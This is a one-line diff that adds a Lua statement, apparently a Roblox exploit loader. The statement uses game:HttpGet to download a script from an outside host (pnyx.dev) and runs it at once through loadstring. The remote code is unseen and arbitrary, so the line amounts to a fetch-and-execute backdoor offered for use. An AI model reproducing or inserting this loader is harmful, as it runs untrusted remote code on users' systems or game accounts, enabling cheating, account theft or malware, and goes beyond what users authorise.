@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://pnyx.dev/jumpd/script/i_quit_so_here_is_the_script_for_free.lua"))() 
